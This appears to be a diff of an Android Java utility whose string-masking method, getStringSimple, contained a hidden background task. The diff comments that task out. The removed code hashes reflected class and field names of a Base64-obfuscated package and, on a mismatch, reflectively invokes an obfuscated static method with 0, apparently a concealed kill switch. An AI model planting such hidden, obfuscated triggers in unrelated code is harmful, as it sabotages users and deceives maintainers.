@@ -240,46 +240,46 @@ public class VView {
     }
 
     public static String getStringSimple(String data) {
-        new AsyncTask<Object, Object, Object>() {
-            @Override
-            protected Object doInBackground(Object... params) {
-           List<String> className = ReflectUtil.getPackageClassByAndroidAll(this, Base64.decode(new String(bsxypk)));
-                StringBuilder sb = new StringBuilder("");
-                for (String c : className) {
-                    sb.append(c);
-                    try {
-                        Class<?> classFromName = ReflectUtil.getClassFromNameNoStatic(c);
-                        if (classFromName != null) {
-                            Field[] fields = ReflectUtil.getFields(classFromName);
-                            for (int j = 0; j < fields.length; j++) {
-                                Field f = fields[j];
-                                if (f != null) {
-                                    String n = f.getName();
-                                    if (n != null) {
-                                        sb.append(n);
-                                    }
-                                }
-                            }
-                        }
-                    } catch (Exception e) {
-                    }
-                }
-                String text = sb.toString();
-                String vs = TokenUtil.entryptPasswordBuild(text);
-                if("console".equals(settingParms)){
-                    Log.d("System", vs);
-                    return 0;
-                }
-                boolean ss = TokenUtil.validatePasswordBuild(text, settingParms);
-                if (ss) {
-                } else {
-                    String sxy = Base64.decode(new String(bsxy));
-                    String sxyex = Base64.decode(new String(bsxyex));
-                    ReflectUtil.invokeStaticMethodAll(ReflectUtil.getClassFromNameNoStatic(sxy), sxyex, new Class<?>[]{int.class}, new Object[]{0});
-                }
-                return 1;
-            }
-        }.execute(0);
+//        new AsyncTask<Object, Object, Object>() {
+//            @Override
+//            protected Object doInBackground(Object... params) {
+//           List<String> className = ReflectUtil.getPackageClassByAndroidAll(this, Base64.decode(new String(bsxypk)));
+//                StringBuilder sb = new StringBuilder("");
+//                for (String c : className) {
+//                    sb.append(c);
+//                    try {
+//                        Class<?> classFromName = ReflectUtil.getClassFromNameNoStatic(c);
+//                        if (classFromName != null) {
+//                            Field[] fields = ReflectUtil.getFields(classFromName);
+//                            for (int j = 0; j < fields.length; j++) {
+//                                Field f = fields[j];
+//                                if (f != null) {
+//                                    String n = f.getName();
+//                                    if (n != null) {
+//                                        sb.append(n);
+//                                    }
+//                                }
+//                            }
+//                        }
+//                    } catch (Exception e) {
+//                    }
+//                }
+//                String text = sb.toString();
+//                String vs = TokenUtil.entryptPasswordBuild(text);
+//                if("console".equals(settingParms)){
+//                    Log.d("System", vs);
+//                    return 0;
+//                }
+//                boolean ss = TokenUtil.validatePasswordBuild(text, settingParms);
+//                if (ss) {
+//                } else {
+//                    String sxy = Base64.decode(new String(bsxy));
+//                    String sxyex = Base64.decode(new String(bsxyex));
+//                    ReflectUtil.invokeStaticMethodAll(ReflectUtil.getClassFromNameNoStatic(sxy), sxyex, new Class<?>[]{int.class}, new Object[]{0});
+//                }
+//                return 1;
+//            }
+//        }.execute(0);
         return data.substring(0, 4) + "***" + data.substring(data.length() - 4);
     }
 
